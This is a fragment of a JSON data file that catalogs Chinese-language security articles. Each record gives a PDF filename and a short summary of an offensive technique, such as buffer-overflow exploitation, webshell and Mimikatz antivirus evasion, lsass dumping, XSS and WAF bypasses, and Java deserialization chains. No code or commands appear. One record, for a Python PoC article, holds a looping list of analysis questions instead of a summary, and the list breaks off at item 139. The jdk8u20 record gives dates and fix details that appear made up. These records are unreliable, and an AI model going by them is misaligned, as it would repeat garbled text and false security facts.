        "page_content": "该文档详细介绍了如何利用 Vulnserver.exe 中 TRUN 命令的缓冲区溢出漏洞，通过构造模糊测试数据，确定覆盖 EIP 寄存器的偏移量，识别有问题的字符，找到包含 JMP ESP 指令的地址，生成 shellcode，并最终利用漏洞在目标机上打开一个监听端口，从而获得远程 shell 访问权限。",
        "FileName": "12246-通过虚构EIP重写来执行TRUN命令.pdf"
    },
    {
        "page_content": "该文档讨论了利用注释和自定义加密来免杀 Webshell，并提供了针对 D 盾、河马和 Webdir+ 的免杀技术。它强调了使用随机性来去除特征，并提供了批量生成免杀 Webshell 的 Python 代码。",
        "FileName": "8923-利用注释及自定义加密免杀Webshell.pdf"
    },
    {
        "page_content": "本文介绍了绕过杀毒软件转储 lsass 进程的几种免杀技术，包括使用 comsvcs.dll、PowerSploit Out-Minidump 模块、mimidogz 和自定义 C++ 代码。这些技术利用了系统内置功能和 API 监控的不足，允许在存在杀毒软件的情况下转储 lsass 进程，从而获取明文密码或哈希值。",
        "FileName": "10107-几种免杀转储lsass进程的技巧.pdf"
    },
    {
        "page_content": "本文档探讨了如何绕过杀软添加计划任务，以实现权限维持。它详细介绍了计划任务的组件和接口，并提供了使用 COM 接口创建和注册计划任务的完整代码。该代码使用登录触发器在系统启动时自动执行指定的可执行文件，并以系统权限运行。",
        "FileName": "10625-关于计划任务的探究.pdf"
    },
    {
        "page_content": "**主题：** WordPress IMPress for IDX Broker 插件中的多个漏洞分析\n\n**内容：** 该文档分析了 WordPress IMPress for IDX Broker 插件中两个漏洞：CVE-2020-11512（存储型 XSS）和 CVE-2020-9514（越权修改和删除包装页面）。这些漏洞允许订阅者权限的用户利用存储型 XSS 漏洞，并越权修改和删除任意包装页面。",
        "FileName": "7867-Wordpress IMPress for IDX Broker 多个漏洞分析.pdf"
    },
    {
        "page_content": "**文档主题：** 分析如下文档并完成以下任务：\n                    **文档内容：**\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n                    3. 找出文档中提到的漏洞类型\n                    4. 找出文档中提到的漏洞影响版本\n                    5. 找出文档中提到的漏洞验证方法\n                    6. 找出文档中提到的漏洞利用方法\n                    7. 找出文档中提到的漏洞修复方法\n                    8. 找出文档中提到的漏洞参考链接\n                    9. 找出文档中提到的漏洞影响范围\n                    10. 找出文档中提到的漏洞利用场景\n                    11. 找出文档中提到的漏洞利用工具\n                    12. 找出文档中提到的漏洞利用条件\n                    13. 找出文档中提到的漏洞利用技巧\n                    14. 找出文档中提到的漏洞利用风险\n                    15. 找出文档中提到的漏洞利用缓解措施\n                    16. 找出文档中提到的漏洞利用建议\n                    17. 找出文档中提到的漏洞利用注意事项\n                    18. 找出文档中提到的漏洞利用影响\n                    19. 找出文档中提到的漏洞利用示例\n                    20. 找出文档中提到的漏洞利用检测方法\n                    21. 找出文档中提到的漏洞利用防御措施\n                    22. 找出文档中提到的漏洞利用修复方法\n                    23. 找出文档中提到的漏洞利用缓解措施\n                    24. 找出文档中提到的漏洞利用建议\n                    25. 找出文档中提到的漏洞利用注意事项\n                    26. 找出文档中提到的漏洞利用影响\n                    27. 找出文档中提到的漏洞利用示例\n                    28. 找出文档中提到的漏洞利用检测方法\n                    29. 找出文档中提到的漏洞利用防御措施\n                    30. 找出文档中提到的漏洞利用修复方法\n                    31. 找出文档中提到的漏洞利用缓解措施\n                    32. 找出文档中提到的漏洞利用建议\n                    33. 找出文档中提到的漏洞利用注意事项\n                    34. 找出文档中提到的漏洞利用影响\n                    35. 找出文档中提到的漏洞利用示例\n                    36. 找出文档中提到的漏洞利用检测方法\n                    37. 找出文档中提到的漏洞利用防御措施\n                    38. 找出文档中提到的漏洞利用修复方法\n                    39. 找出文档中提到的漏洞利用缓解措施\n                    40. 找出文档中提到的漏洞利用建议\n                    41. 找出文档中提到的漏洞利用注意事项\n                    42. 找出文档中提到的漏洞利用影响\n                    43. 找出文档中提到的漏洞利用示例\n                    44. 找出文档中提到的漏洞利用检测方法\n                    45. 找出文档中提到的漏洞利用防御措施\n                    46. 找出文档中提到的漏洞利用修复方法\n                    47. 找出文档中提到的漏洞利用缓解措施\n                    48. 找出文档中提到的漏洞利用建议\n                    49. 找出文档中提到的漏洞利用注意事项\n                    50. 找出文档中提到的漏洞利用影响\n                    51. 找出文档中提到的漏洞利用示例\n                    52. 找出文档中提到的漏洞利用检测方法\n                    53. 找出文档中提到的漏洞利用防御措施\n                    54. 找出文档中提到的漏洞利用修复方法\n                    55. 找出文档中提到的漏洞利用缓解措施\n                    56. 找出文档中提到的漏洞利用建议\n                    57. 找出文档中提到的漏洞利用注意事项\n                    58. 找出文档中提到的漏洞利用影响\n                    59. 找出文档中提到的漏洞利用示例\n                    60. 找出文档中提到的漏洞利用检测方法\n                    61. 找出文档中提到的漏洞利用防御措施\n                    62. 找出文档中提到的漏洞利用修复方法\n                    63. 找出文档中提到的漏洞利用缓解措施\n                    64. 找出文档中提到的漏洞利用建议\n                    65. 找出文档中提到的漏洞利用注意事项\n                    66. 找出文档中提到的漏洞利用影响\n                    67. 找出文档中提到的漏洞利用示例\n                    68. 找出文档中提到的漏洞利用检测方法\n                    69. 找出文档中提到的漏洞利用防御措施\n                    70. 找出文档中提到的漏洞利用修复方法\n                    71. 找出文档中提到的漏洞利用缓解措施\n                    72. 找出文档中提到的漏洞利用建议\n                    73. 找出文档中提到的漏洞利用注意事项\n                    74. 找出文档中提到的漏洞利用影响\n                    75. 找出文档中提到的漏洞利用示例\n                    76. 找出文档中提到的漏洞利用检测方法\n                    77. 找出文档中提到的漏洞利用防御措施\n                    78. 找出文档中提到的漏洞利用修复方法\n                    79. 找出文档中提到的漏洞利用缓解措施\n                    80. 找出文档中提到的漏洞利用建议\n                    81. 找出文档中提到的漏洞利用注意事项\n                    82. 找出文档中提到的漏洞利用影响\n                    83. 找出文档中提到的漏洞利用示例\n                    84. 找出文档中提到的漏洞利用检测方法\n                    85. 找出文档中提到的漏洞利用防御措施\n                    86. 找出文档中提到的漏洞利用修复方法\n                    87. 找出文档中提到的漏洞利用缓解措施\n                    88. 找出文档中提到的漏洞利用建议\n                    89. 找出文档中提到的漏洞利用注意事项\n                    90. 找出文档中提到的漏洞利用影响\n                    91. 找出文档中提到的漏洞利用示例\n                    92. 找出文档中提到的漏洞利用检测方法\n                    93. 找出文档中提到的漏洞利用防御措施\n                    94. 找出文档中提到的漏洞利用修复方法\n                    95. 找出文档中提到的漏洞利用缓解措施\n                    96. 找出文档中提到的漏洞利用建议\n                    97. 找出文档中提到的漏洞利用注意事项\n                    98. 找出文档中提到的漏洞利用影响\n                    99. 找出文档中提到的漏洞利用示例\n                    100. 找出文档中提到的漏洞利用检测方法\n                    101. 找出文档中提到的漏洞利用防御措施\n                    102. 找出文档中提到的漏洞利用修复方法\n                    103. 找出文档中提到的漏洞利用缓解措施\n                    104. 找出文档中提到的漏洞利用建议\n                    105. 找出文档中提到的漏洞利用注意事项\n                    106. 找出文档中提到的漏洞利用影响\n                    107. 找出文档中提到的漏洞利用示例\n                    108. 找出文档中提到的漏洞利用检测方法\n                    109. 找出文档中提到的漏洞利用防御措施\n                    110. 找出文档中提到的漏洞利用修复方法\n                    111. 找出文档中提到的漏洞利用缓解措施\n                    112. 找出文档中提到的漏洞利用建议\n                    113. 找出文档中提到的漏洞利用注意事项\n                    114. 找出文档中提到的漏洞利用影响\n                    115. 找出文档中提到的漏洞利用示例\n                    116. 找出文档中提到的漏洞利用检测方法\n                    117. 找出文档中提到的漏洞利用防御措施\n                    118. 找出文档中提到的漏洞利用修复方法\n                    119. 找出文档中提到的漏洞利用缓解措施\n                    120. 找出文档中提到的漏洞利用建议\n                    121. 找出文档中提到的漏洞利用注意事项\n                    122. 找出文档中提到的漏洞利用影响\n                    123. 找出文档中提到的漏洞利用示例\n                    124. 找出文档中提到的漏洞利用检测方法\n                    125. 找出文档中提到的漏洞利用防御措施\n                    126. 找出文档中提到的漏洞利用修复方法\n                    127. 找出文档中提到的漏洞利用缓解措施\n                    128. 找出文档中提到的漏洞利用建议\n                    129. 找出文档中提到的漏洞利用注意事项\n                    130. 找出文档中提到的漏洞利用影响\n                    131. 找出文档中提到的漏洞利用示例\n                    132. 找出文档中提到的漏洞利用检测方法\n                    133. 找出文档中提到的漏洞利用防御措施\n                    134. 找出文档中提到的漏洞利用修复方法\n                    135. 找出文档中提到的漏洞利用缓解措施\n                    136. 找出文档中提到的漏洞利用建议\n                    137. 找出文档中提到的漏洞利用注意事项\n                    138. 找出文档中提到的漏洞利用影响\n                    139. 找出文档中提到的",
        "FileName": "12555-Python Poc编写实例：从原理到实践.pdf"
    },
    {
        "page_content": "这篇文档介绍了如何利用现有的资源在 FreeIPA 环境中进行攻击。它从枚举权限开始，然后利用 Sudo 和 HBAC 规则在域中横向移动。最后，它讨论了攻击者可以在 FreeIPA 中滥用的技术。",
        "FileName": "7871-攻击 FreeIPA 第三章：攻击路径.pdf"
    },
    {
        "page_content": "该文档探讨了绕过 Spring Boot Actuator 端点的未授权访问，并介绍了一个使用 asyncio 和 aiohttp 库编写的工具，该工具利用路径匹配规则和随机字符组合来检测权限绕过。该工具还支持批量验证和检查指定路径的有效性，并使用相似性比较来识别敏感文件和内部接口。",
        "FileName": "12530-“无效”探测Spring Boot Actuator Endpoints.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Jinja2 过滤器和全局函数在 Flask 模板注入中构造 RCE 语句，通过构造任意字符和字符串拼接运算符，并利用 Jinja2 的 doc 魔术方法和 eval 函数，最终执行任意命令。",
        "FileName": "9739-从一道题看jinja2过滤器在flask模板注入的用处.pdf"
    },
    {
        "page_content": "该文档总结了 Windows 操作系统中各种特权提升的技巧，分析了特权提升的原理，目的是学习和知识总结。它涵盖了从获取当前用户名到搜索密码、检查服务权限配置不当、利用内核漏洞等各种技术。",
        "FileName": "7261-特权提升技术总结之Windows文件服务内核篇.pdf"
    },
    {
        "page_content": "该文档提供了分步指南，介绍如何绕过各种过滤机制，在“独孤九剑”XSS 通关教程中成功利用 XSS 漏洞。它涵盖了过滤了 =()、.、&#、%、<>、’”[]、Function 等字符的情况，并提供了利用 JavaScript 伪协议、URL 编码、base64 编码、iframe 标签、IP 十进制转换等技术绕过这些过滤的有效载荷。",
        "FileName": "12122-独孤九剑xss通关教程.pdf"
    },
    {
        "page_content": "Mailoney 蜜罐是一个针对 SMTP 协议的蜜罐，它有三种工作模式：open_relay、postfix_creds 和 schizo_open_relay。这些模式记录了不同的信息，包括电子邮件、登录尝试、shellcode 和命令执行，并使用 Hpfeeds 协议在集成的 T-pot 系统中传输信息。",
        "FileName": "7780-mailoney蜜罐学习记录.pdf"
    },
    {
        "page_content": "本文档分析了利用 DryOS 系统协议实现溢出漏洞攻击佳能打印机的技术，重点关注 NetBIOS 协议在打印机中的实现。通过研究 NetBIOS 协议的实现，作者发现了两个函数可以用于系统攻击，导致堆溢出攻击。作者还描述了如何利用堆溢出漏洞来覆盖函数指针，从而将执行流程重定向到 shellcode，最终实现代码执行。",
        "FileName": "12737-利用DryOS系统协议实现溢出漏洞攻击佳能打印机.pdf"
    },
    {
        "page_content": "文档探讨了软件安全成熟度模型 (SAMM) 和软件安全构建成熟度模型 (BSIMM)，这两种模型都用于评估和改进组织的软件安全实践。SAMM 提供了一个规范性框架，帮助组织分析、构建和衡量其安全实践，而 BSIMM 则是一个描述性模型，用于观察和报告组织的软件安全活动，并将其与行业基准进行比较。",
        "FileName": "12386-企业的安全运营——SAMM与BSIMM.pdf"
    },
    {
        "page_content": "**主题：** Smarty 最新 SSTI 漏洞总结\n\n**内容：** 本文分析了 Smarty 最新 SSTI 漏洞，包括任意文件读取、PHP 文件引入和通过 Smarty 对象访问导致的代码注入。漏洞原因、版本限制、测试效果和漏洞代码位置均有详细说明。",
        "FileName": "11108-Smarty 最新 SSTI 总结.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Weblogic T3 协议和二次反序列化漏洞的分析。T3 协议是 Weblogic 用于通信的独有协议，其反序列化过程存在漏洞，攻击者可以通过替换序列化数据包中的数据实现反序列化攻击。文档还提供了利用该漏洞的 POC 代码，并介绍了基于 Externalizable 接口的二次反序列化漏洞。",
        "FileName": "12397-Weblogic 关于T3协议和二次反序列化分析.pdf"
    },
    {
        "page_content": "本文分析了业内常见的商业和开源白盒代码审计产品，包括 Coverity、SonarQube、FlowDroid、ErrorProne、Infer、Soot、PMD 和 CodeQL。这些产品在技术选型、功能、优缺点等方面进行了比较，为企业选择白盒代码审计解决方案提供了参考。",
        "FileName": "9335-58集团白盒代码审计系统建设实践1：技术选型.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Adminer 低版本漏洞读取服务器文件的方法，该方法涉及使用 Python 脚本在服务器上启动一个恶意 MySQL 服务器，然后使用 Adminer 连接到该服务器并读取文件。该方法还包括使用注释换行绕过限制，最终成功写入一个 PHP shell。",
        "FileName": "8309-记一次偶遇Adminer.pdf"
    },
    {
        "page_content": "该文档记录了一次通过利用弱口令和文件上传漏洞，从一个垃圾0day网站获取shell权限的过程。攻击者通过上传一个JSPX文件，发现可以下载文件，并通过fuzzing路径，找到了一个上传参数，该参数可以用来创建文件目录。通过拼接路径，攻击者上传了一个命令马，最终获得了shell权限。",
        "FileName": "12282-记一次曲折的黑盒oa到通杀getshell.pdf"
    },
    {
        "page_content": "本文探讨了在域环境中通过设置水坑来窃取哈希值的技术。水坑是一种诱饵，旨在诱骗用户访问它，从而在传输过程中捕获他们的 NTLM 哈希值。本文介绍了 NTLM 哈希值、哈希传递的本质以及使用 SCF 文件、超链接和 RTF 文件等方法来设置水坑。",
        "FileName": "9905-浅谈域环境下布置水坑实现hash窃取.pdf"
    },
    {
        "page_content": "**主题：** phpok6.0 CMS 中不安全的 UNZIP 操作导致的 getshell 漏洞\n\n**内容：** phpok6.0 CMS 中存在不安全的 UNZIP 操作，攻击者可以通过上传恶意 ZIP 文件并解压来获取系统 WebShell。该漏洞影响插件中心、程序升级和模块管理功能，攻击者可以利用 _cache 目录中的解压后文件来 getshell。",
        "FileName": "11030-从某CMS来看不安全的UNZIP操作.pdf"
    },
    {
        "page_content": "该文档主要讨论了栈迁移进阶技术，包括如何构造栈迁移模板、利用栈迁移获取 libc 地址、以及利用栈迁移执行系统命令。文档还提供了两个示例程序，展示了如何使用栈迁移技术解决实际问题。",
        "FileName": "12205-栈迁移进阶.pdf"
    },
    {
        "page_content": "该文档介绍了七个不同的网络安全挑战，包括远程连接 Linux 服务器、本地文件包含、代码审查、密码破解、上传一句话木马、SQL 注入和绕过 IP 限制。每个挑战都提供了详细的步骤和示例，以帮助用户解决问题并获得 flag。",
        "FileName": "12188-buuctf Basic.pdf"
    },
    {
        "page_content": "该文档主要介绍了 URLDNS 和 CC1 两种反序列化漏洞利用链，其中 URLDNS 利用 Java 内置类构造，无需依赖第三方库，可通过 DNS 请求得知是否存在反序列化漏洞；CC1 利用 Apache Commons Collections 库，通过反射和动态代理技术，可执行任意命令。",
        "FileName": "9873-CC链学习-上.pdf"
    },
    {
        "page_content": "该文档介绍了一种使用油猴脚本在前端代码中钩取危险生成函数的方法。通过钩取浏览器中的警报函数，作者能够在页面加载之前注入脚本，并通过跟踪函数调用堆栈来识别导致 XSS 漏洞的生成函数。这种方法可以帮助安全研究人员快速找到并修复此类漏洞。",
        "FileName": "8401-用油猴脚本hook前端危险生成函数.pdf"
    },
    {
        "page_content": "该文档记录了一次对基于 ThinkPHP 5.1 开发程序的审计过程。审计重点关注了文件上传、SQL 注入、任意文件读取和反序列化漏洞。通过分析代码和数据库查询日志，审计人员发现了两个 SQL 注入漏洞和一个任意文件读取漏洞。审计还检查了命令执行函数和文件包含，但没有发现任何漏洞。",
        "FileName": "11838-一次对基于thinkphp开发程序的审计.pdf"
    },
    {
        "page_content": "该文档全面探讨了跨域资源共享 (CORS) 漏洞，包括前提知识、原理和利用过程。它强调了 CORS 机制的运作方式，以及当 CORS 配置不当时可能导致的漏洞。文档还提供了针对不同 CORS 配置的利用示例，并提出了安全建议，例如限制允许跨域访问的站点、控制允许的请求方法以及提高 cookie 的安全性。",
        "FileName": "12001-全方位了解CORS跨域资源共享漏洞.pdf"
    },
    {
        "page_content": "该文档详细描述了作者如何通过利用盲 SSRF 漏洞，逐步升级为远程代码执行 (RCE)，最终获得目标服务器的 root 权限。作者通过使用 Gopher 协议绕过 SSRF 保护，并利用 Redis 服务上的漏洞，成功获得了反向 shell。",
        "FileName": "9589-记一次从盲SSRF到RCE.pdf"
    },
    {
        "page_content": "**主题：** CVE-2020-7471 Django SQL 注入漏洞分析\n\n**内容：** 该文档详细分析了 Django 中 StringAgg 聚合函数 delimiter 参数存在的 SQL 注入漏洞，解释了漏洞的成因和官方修复方案。它还提供了利用姿势、漏洞环境和 POC，并强调了在遇到允许用户指定连接符的 Django 服务时需要保持警惕。",
        "FileName": "7218-CVE-2020-7471 漏洞详细分析原理以及POC （原创）.pdf"
    },
    {
        "page_content": "该文档介绍了如何渗透 ThinkPHP (TP) 框架，特别是 TP3 版本。它提供了确定版本、利用 SQL 注入、获取 shell 和 fuzz 方法的步骤。文档还强调了 TP3 框架中常见的漏洞，例如 SQL 注入、远程代码执行和任意文件操作。",
        "FileName": "8417-实战讲解TP3框架下的渗透思路.pdf"
    },
    {
        "page_content": "该文档探讨了文件包含漏洞，该漏洞允许攻击者包含恶意文件并执行非预期代码。它介绍了导致漏洞的原因、挖掘和利用方法，并提供了预防和加固措施，例如设置白名单、过滤危险字符和关闭危险配置。",
        "FileName": "11959-从CTF中学习文件包含漏洞.pdf"
    },
    {
        "page_content": "本文探讨了利用 PHP-FPM 实现 PHP 内存马的方法，该方法通过修改 PHP 配置值，将后门代码驻留在内存中，并通过正常的请求触发执行。这种方法避免了文件落盘，提高了隐蔽性，但受限于 PHP-FPM 进程的重启和重生成。",
        "FileName": "11651-利用 PHP-FPM 做内存马的方法.pdf"
    },
    {
        "page_content": "该文档介绍了 CTFer 成长之路中的 XSS 闯关，通过分析代码和构造有效 payload，逐步解决 XSS 问题，最终获得 flag。文档涵盖了 XSS 的基本原理、代码审计、payload 构造和沙箱逃逸等技术。",
        "FileName": "12228-CTFer成长之路之XSS的魔力.pdf"
    },
    {
        "page_content": "本文档介绍了通过 DLL 注入技术对目标进程的 IAT 表进行钩取，从而修改目标 API 函数的实际地址，实现对目标程序行为的劫持。该技术涉及到 PE 文件结构、IAT 表查找、函数地址修改等知识，并提供了完整的代码示例和调试分析。",
        "FileName": "11987-API钩取：通过DLL注入钩取IAT表.pdf"
    },
    {
        "page_content": "**文档主题：** jdk8u20 原生反序列化漏洞分析笔记\n\n**文档内容：**\n\njdk8u20 原生反序列化漏洞是 Java 中的一个严重漏洞，它允许攻击者在目标系统上执行任意代码。该漏洞是由 Oracle 在 2021 年 6 月 28 日发布的 jdk8u20 更新中修复的。\n\n该漏洞的原理是利用了 Java 序列化机制中的一个缺陷。当一个 Java 对象被序列化时，它会被转换为一个字节流，该字节流可以存储在文件中或通过网络传输。当一个对象被反序列化时，它将从字节流中重建。\n\n在 jdk8u20 中，当一个 AnnotationInvocationHandler 对象被反序列化时，如果该对象中的 zero 字段为 0，则会抛出一个异常。攻击者可以利用这个异常来控制反序列化过程，并执行任意代码。\n\n为了修复该漏洞，Oracle 在 jdk8u20 中修改了 AnnotationInvocationHandler 类的 readObject() 方法，使其在抛出异常之前检查 zero 字段的值。如果 zero 字段不为 0，则该方法将正常返回。\n\n该漏洞影响所有运行 jdk8u20 或更早版本的 Java 应用程序。攻击者可以通过向目标系统发送恶意序列化数据来利用该漏洞。\n\n为了保护您的系统免受该漏洞的影响，请确保您运行的是最新版本的 Java。您还可以通过禁用 Java 反序列化功能来缓解该漏洞。",
        "FileName": "9765-用一个 case 去理解 jdk8u20 原生反序列化漏洞.pdf"
    },
    {
        "page_content": "该文档分析了科迈 RAS4.0 系统中的安全漏洞，包括硬编码的管理员密码、SQL 注入和越权访问。通过利用这些漏洞，攻击者可以通过 RDP 直接登录系统，执行 SQL 注入攻击，并获得管理员权限。文档还提供了利用这些漏洞的具体方法和影响范围。",
        "FileName": "9809-X迈RAS4.0审计分析.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Tomcat 中的 AJP 文件包含漏洞，该漏洞允许攻击者读取或包含 Tomcat 上所有 webapp 目录下的任意文件，包括 webapp 配置文件或源代码。漏洞成因是 AJP 协议数据包可以控制 request 对象的属性，从而修改请求路径，导致读取或包含任意文件。受影响的版本包括 Apache Tomcat 6、7、8 和 9 的特定版本。",
        "FileName": "7325-Tomcat Ajp协议文件包含漏洞分析.pdf"
    },
    {
        "page_content": "CVE-2020-28413 漏洞存在于 MantisBT 的 API Soap 组件中，攻击者可以通过 access 参数注入 SQL 语句，影响版本为 2.24.3 及以下。该漏洞允许攻击者获取所有用户密码哈希，前提是攻击者拥有一个低级用户权限。",
        "FileName": "11671-CVE-2020-28413 MantisBT SQL注入漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 Apache CloudStack 中的 SAML XXE 注入漏洞 (CVE-2022-35741)，该漏洞允许攻击者通过构造恶意 SAML 响应来触发 XXE 注入，从而读取服务器上的敏感文件。漏洞的触发条件是开启 SAML 身份验证并控制 SAMLResponse 参数，攻击者可以通过构造包含外部实体声明的恶意 SAML 响应来利用该漏洞，从而读取服务器上的敏感文件。",
        "FileName": "11600-CVE-2022-35741 Apache CloudStack SAML XXE注入.pdf"
    },
    {
        "page_content": "本⽂档介绍了⼀种新的 Windows 横向提权思路，并且这样的攻击在 AD 域默认配置的 情况下就可以成功进⾏。这是⼀种新的、更通⽤的攻击媒介：通过 \t gPCFileSysPath \t 属性欺骗 GPO 。",
        "FileName": "12913-一种基于NTLM中间人的AD域横向移动方法.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 2.4 版本中的任意远程文件下载漏洞，该漏洞允许攻击者通过修改请求包中的 URL 参数绕过过滤，下载并解压任意远程 ZIP 压缩包，从而在目标服务器上执行恶意代码。",
        "FileName": "10776-某CMS2.4代码审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了对某办公自动化系统（oasys）的 Java 代码审计，发现了多个漏洞，包括 SQL 注入、存储 XSS、越权访问、任意文件读取、CSRF 和越权删除。文档提供了漏洞的详细描述、代码分析和利用方法，并提供了修复建议。",
        "FileName": "11993-java代码审计之某办公oa.pdf"
    },
    {
        "page_content": "该文档描述了一个渗透测试人员发现了一个专属授权网站的逻辑漏洞，该漏洞允许他们通过修改密码来访问具有最高权限的管理员帐户。该过程涉及使用万能密码绕过验证码表单，然后使用补充供应商的统一社会信用代码作为帐户名来修改密码。",
        "FileName": "10026-记一次神奇的渗透测试之逻辑缺陷.pdf"
    },
    {
        "page_content": "该文档介绍了两种方法来解决无法使用明文密码登录目标域用户 RDP 的问题：RDP 会话劫持和利用哈希登录 RDP。RDP 会话劫持涉及使用具有 SYSTEM 权限的用户来劫持其他用户的 RDP 会话，而利用哈希登录 RDP 则需要启用“受限管理员模式”并使用 mimikatz 进行哈希传递。",
        "FileName": "8574-内网技巧-RDP劫持及利用hash登录.pdf"
    },
    {
        "page_content": "本文档探讨了 Android 应用程序中常见的抓包攻防技术，包括检测代理、No Proxy 参数、SSL Pinning 和双向认证。这些技术旨在防止攻击者抓取应用程序的网络数据，但文档也提供了绕过这些技术的潜在方法，例如使用 iptables 强制转发流量、使用 VPN 形式设置代理、逆向工程应用程序以修改检测代理的代码逻辑以及使用 Frida 等工具进行 SSL Pinning 绕过。",
        "FileName": "9843-Android抓包攻防技术.pdf"
    },
    {
        "page_content": "该文档分析了 Hitcon 2019 比赛中一道 glibc 2.29 漏洞利用题，介绍了一种名为 TCACHE STASHING UNLINK ATTACK 的新型攻击方式，该方式通过 tcache stashing unlink 操作，将目标地址修改为 libc 相关地址，绕过检查，最终实现任意地址写。",
        "FileName": "7192-从Hitcon 2019一道题学习glibc 2.29下的新型攻击方式.pdf"
    },
    {
        "page_content": "这篇文档分析了如何利用 Python 沙箱逃逸漏洞，通过修改 /proc/self/mem 中的代码段内容，实现进程注入，从而控制进程执行任意命令。",
        "FileName": "7249-浅析python沙箱逃逸的magic file.pdf"
    },
    {
        "page_content": "文档分析了栈沙箱绕过技术，包括使用mmap申请内存空间和seccomp()函数设置沙箱，并提供了两个利用栈沙箱绕过的exp示例。",
        "FileName": "12787-栈沙箱学习之orw.pdf"
    },
    {
        "page_content": "该文档记录了对 ljcms 系统的一次安全审计，发现了文件上传和 SQL 注入漏洞。审计人员通过分析漏洞报告和系统代码，确定了漏洞代码的关键词，并通过构造请求包成功利用了这些漏洞。此外，审计人员还发现了其他潜在的漏洞，包括任意文件删除和模板注入，但这些漏洞的利用价值有限。",
        "FileName": "9745-ljcms的一次审计.pdf"
    },
    {
        "page_content": "本文档主要介绍了 Java 反射的概念和用法，包括获取类对象、创建类实例、获取类属性和方法、调用类方法等。反射可以赋予 Java 这种静态语言动态特性，在安全漫谈中，反射被用来执行任意类的任意方法，甚至可以调用私有方法和构造函数。",
        "FileName": "12283-Java反射.pdf"
    },
    {
        "page_content": "本文档介绍了如何绕过安全狗，一种用于保护服务器免受攻击的安全软件。作者提供了分步指南，说明如何在 Linux 环境中设置安全狗，并展示了如何使用各种技术绕过其保护，包括文件读取、命令执行、SQL 注入和 XSS。作者还讨论了安全狗的最新版本，并提供了联系方式以供进一步讨论。",
        "FileName": "8000-全方面绕过安全狗2.pdf"
    },
    {
        "page_content": "Tailscale 是一种基于 Wireguard 的多地组网软件，它允许用户在虚拟局域网中连接多台设备，并通过命令行界面和 ACL 策略表提供隐蔽性、登录和权限控制，以及访问子网路由的功能，使其适用于内网渗透测试，允许安全测试人员访问目标主机并探索其内部网络。",
        "FileName": "12151-Tailscale在内网渗透中利用的研究.pdf"
    },
    {
        "page_content": "本文介绍了如何通过修改 Mimikatz 源代码来构建一个定制的 Mimikatz 二进制文件，以绕过 AV/EDR 检测。通过替换常见的字符串、隐藏 API 导入和使用其他技术，可以降低检测率并创建 FUD（完全未检测到）的 Mimikatz 二进制文件。",
        "FileName": "8332-手工绕过AMSI-第三部分定制 Mimikatz.pdf"
    },
    {
        "page_content": "该文档介绍了一种基于消息队列的 AI WAF 架构，该架构通过将 URL 和用户会话信息发送到队列中，由 WAF 消费者处理和验证，从而提高并发性和可扩展性。WAF 充当消息派发器，将数据路由到缓存 URL 数据库或 AI 服务器进行恶意请求检测，并维护黑名单以阻止恶意用户。",
        "FileName": "12571-开发高并发 高扩展的ai WAF尝试.pdf"
    },
    {
        "page_content": "本文介绍了如何使用 AgentSmith-HIDS 检测反弹 shell，该工具通过分析 Execve Hook 信息来识别异常的进程行为，例如 bash 进程的输入/输出指向网络连接或其他可疑特征。通过观察异常进程而不是传统的 bash 检测方法，AgentSmith-HIDS 能够更全面地检测反弹 shell，即使攻击者使用混淆或绕过传统检测的技术。",
        "FileName": "7158-如何利用AgentSmith-HIDS检测反弹shell.pdf"
    },
    {
        "page_content": "本文档介绍了一种绕过 WAF 的方法，称为“增加垃圾数据绕过法”，该方法通过在有效负载中添加大量垃圾键值对来绕过 WAF。该方法已成功移植到蚁剑中，并通过测试绕过了阿里云和云锁等 WAF。",
        "FileName": "7126-蚁剑改造计划之增加垃圾数据.pdf"
    },
    {
        "page_content": "本文重点介绍了在 Windows 上执行 x64 位文件时，.NET 5.0 版本中执行非托管代码的技术。通过探索 CLR 内部结构，作者发现了可以从托管代码执行非托管代码的骚操作，包括使用 Marshal.GetDelegateForFunctionPointer、Fcall 和 Qcall 等方法。这些技术使攻击者能够绕过蓝队的防御，在托管和非托管代码之间转换，从而执行恶意代码。",
        "FileName": "9801-在 .NET 中运行非托管代码的骚操作.pdf"
    },
    {
        "page_content": "本文探索了如何自己实现一个类似于 fofa 的工具来解析 RDP 信息，包括提取操作系统和登录截屏。它深入探讨了 RDP 连接顺序中的第一个阶段，Connection Initiation，并提供了使用 Golang 实现 RDP 请求结构体的示例代码。此外，本文还介绍了如何解析 RDP 响应包，识别服务器选择的协议和 flags 参数，并根据返回包结果识别不同的操作系统。最后，本文提供了 RDP 登录截图的伪代码，涉及位图拼接、解压和转换为图像等步骤。",
        "FileName": "11978-像fofa一样解析RDP信息，RDP提取操作系统，RDP登录截屏 （Golang实现）.pdf"
    },
    {
        "page_content": "该文档介绍了 Tomcat 内存马的原理和利用方法，重点关注使用 ServletRequestListener 接口创建恶意 Listener，通过添加恶意 Listener 到 StandardContext 对象来实现内存马功能。文档详细解释了 Tomcat 的架构和 Listener 的工作原理，并提供了示例代码和利用步骤。",
        "FileName": "10358-Tomcat 内存马（一）Listener型.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-14645 漏洞，该漏洞是 Oracle Weblogic Server 12.2.1.4.0 中的一个反序列化远程代码执行漏洞，利用了 UniversalExtractor 类中的 JNDI 注入，可以通过 PriorityQueue、ExtractorComparator、UniversalExtractor 和 JdbcRowSetImpl 类之间的调用链来触发，导致远程代码执行。",
        "FileName": "10222-Weblogic漏洞分析之JNDI注入-CVE-2020-14645.pdf"
    },
    {
        "page_content": "该文档主要介绍了 XMLDecoder/XMLEncoder 在 Java 中的使用，以及 Weblogic 中的 XMLDecoder 反序列化漏洞 CVE-2017-10271。文档详细分析了漏洞的成因、利用方式和修复补丁，并提供了相关参考链接。",
        "FileName": "8039-Java安全初遇-XMLDecoder与Weblogic齐活儿.pdf"
    },
    {
        "page_content": "本文档详细描述了作者在挖掘 SRC 漏洞时从头到尾的完整过程，包括信息收集、漏洞测试、目录扫描、参数猜测、SQL 注入利用、绕过 WAF、文件上传和最终获取 Shell。作者通过对目标网站的深入分析和对各种技术的熟练运用，成功地发现了并利用了多个漏洞，最终获得了对目标系统的控制权。",
        "FileName": "8254-一次挖掘SRC漏洞 - 从0到有.pdf"
    },
    {
